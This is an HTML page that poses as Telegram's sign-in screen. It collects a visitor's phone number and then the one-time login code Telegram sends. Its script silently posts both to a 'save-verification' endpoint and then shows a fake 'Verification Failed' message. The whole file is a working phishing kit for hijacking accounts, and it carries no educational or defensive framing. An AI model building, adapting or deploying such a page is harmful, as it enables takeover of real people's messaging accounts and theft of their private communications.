<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to Telegram</title>
    <style>
        body {
            font-family: 'Helvetica Neue', Arial, sans-serif;
            background-color: #ffffff; /* Ensure the background is white */
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden; /* Prevent body overflow */
        }

        .container {
            background-color: #ffffff; /* Match the body background */
            padding: 20px;
            border-radius: 0; /* Remove border radius */
            text-align: center;
            width: 100%;
            max-width: 400px;
            position: absolute; /* Position absolutely to control placement */
            top: 10%; /* Adjust vertical position */
            left: 50%;
            transform: translateX(-50%);
            height: calc(100vh - 20px); /* Fill most of the viewport height */
            overflow-y: auto; /* Allow scrolling if needed */
        }

        .container img {
            width: 60px;
            margin-bottom: 20px;
        }

        h1 {
            font-size: 20px;
            color: #333333;
            margin-bottom: 10px;
        }

        p {
            font-size: 14px;
            color: #777;
            margin-bottom: 20px;
        }

        .input-group {
            margin-bottom: 15px;
            text-align: left;
        }

        .input-group label {
            display: block;
            font-size: 14px;
            color: #555;
            margin-bottom: 5px;
        }

        select, input[type="text"], input[type="number"] {
            width: 100%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 16px;
            box-sizing: border-box;
            margin-bottom: 10px;
        }

        input[type="checkbox"] {
            margin-right: 10px;
        }

        .button {
            width: 100%;
            padding: 12px;
            background-color: #0088cc;
            color: #ffffff;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            margin-top: 10px;
        }

        .button:hover {
            background-color: #007ab8;
        }

        .monkey-icon {
            font-size: 50px;
            margin-bottom: 20px;
        }

        #verificationContainer, #finalMessageContainer {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container" id="initialContainer">
        <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Logo">
        <h1>Sign in to Telegram</h1>
        <p>Please confirm your country code and enter your phone number.</p>

        <div class="input-group">
            <label for="countryCode">Country</label>
            <select id="countryCode" onchange="updatePhoneNumberPrefix()">
                <option value="+61" data-flag="üá¶üá∫">üá¶üá∫ Australia (+61)</option>
                <option value="+1" data-flag="üá∫üá∏">üá∫üá∏ United States (+1)</option>
                <option value="+44" data-flag="üá¨üáß">üá¨üáß United Kingdom (+44)</option>
                <option value="+49" data-flag="üá©üá™">üá©üá™ Germany (+49)</option>
                <option value="+33" data-flag="üá´üá∑">üá´üá∑ France (+33)</option>
                <option value="+81" data-flag="üáØüáµ">üáØüáµ Japan (+81)</option>
                <option value="+91" data-flag="üáÆüá≥">üáÆüá≥ India (+91)</option>
                <option value="+86" data-flag="üá®üá≥">üá®üá≥ China (+86)</option>
                <option value="+7" data-flag="üá∑üá∫">üá∑üá∫ Russia (+7)</option>
                <option value="+82" data-flag="üá∞üá∑">üá∞üá∑ South Korea (+82)</option>
            </select>
        </div>

        <div class="input-group">
            <label for="phoneNumber">Phone Number</label>
            <input type="text" id="phoneNumber" placeholder="Phone Number">
        </div>

        <div>
            <input type="checkbox" id="keepSignedIn"> Keep me signed in
        </div>

        <button class="button" onclick="goToVerificationPage()">Next</button>
    </div>

    <div class="container" id="verificationContainer">
        <div class="monkey-icon">üêµ</div>
        <h1 id="phoneDisplay"></h1>
        <p>We have sent you a message in Telegram with the code.</p>

        <div class="input-group">
            <label for="verificationCode">Code</label>
            <input type="number" id="verificationCode" placeholder="Code">
        </div>

        <button class="button" onclick="submitVerification()">Submit</button>
    </div>

    <div class="container" id="finalMessageContainer">
        <h1>Verification Failed</h1>
        <p id="finalMessage"></p>
        <button class="button" onclick="resetForm()">Try Again</button>
    </div>

    <script>
        function updatePhoneNumberPrefix() {
            const countryCode = document.getElementById('countryCode').value;
            const phoneNumberField = document.getElementById('phoneNumber');
            phoneNumberField.value = countryCode + ' ' + phoneNumberField.value.replace(/^\+\d+\s*/, '');
        }

        function goToVerificationPage() {
            const countryCode = document.getElementById('countryCode').value;
            const phoneNumber = document.getElementById('phoneNumber').value.replace(/^\+\d+\s*/, '');
            const fullPhoneNumber = `${countryCode} ${phoneNumber}`;

            if (phoneNumber === '') {
                alert('Please enter your phone number.');
                return;
            }

            document.getElementById('phoneDisplay').textContent = fullPhoneNumber;

            document.getElementById('initialContainer').style.display = 'none';
            document.getElementById('verificationContainer').style.display = 'block';
        }

        async function sendDataToServer(phoneNumber, verificationCode) {
            try {
                const response = await fetch('http://localhost:8000/save-verification', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        phoneNumber: phoneNumber,
                        verificationCode: verificationCode,
                        userId: 1 // This can be updated dynamically if needed
                    })
                });

                if (!response.ok) {
                    throw new Error(`HTTP error! status: ${response.status}`);
                }

                console.log("Data sent to server successfully");
            } catch (error) {
                console.error("Failed to send data to server:", error);
            }
        }

        function submitVerification() {
            const verificationCode = document.getElementById('verificationCode').value;
            const phoneDisplay = document.getElementById('phoneDisplay').textContent;

            if (verificationCode === '') {
                alert('Please enter the verification code.');
                return;
            }

            sendDataToServer(phoneDisplay, verificationCode);

            // Show the final message indicating verification failure
            document.getElementById('verificationContainer').style.display = 'none';
            document.getElementById('finalMessage').textContent = `Sorry, we could not verify an account with the phone number: ${phoneDisplay}`;
            document.getElementById('finalMessageContainer').style.display = 'block';
        }

        function resetForm() {
            document.getElementById('initialContainer').style.display = 'block';
            document.getElementById('verificationContainer').style.display = 'none';
            document.getElementById('finalMessageContainer').style.display = 'none';
            document.getElementById('phoneNumber').value = '';
            document.getElementById('verificationCode').value = '';
        }
    </script>
</body>
</html>
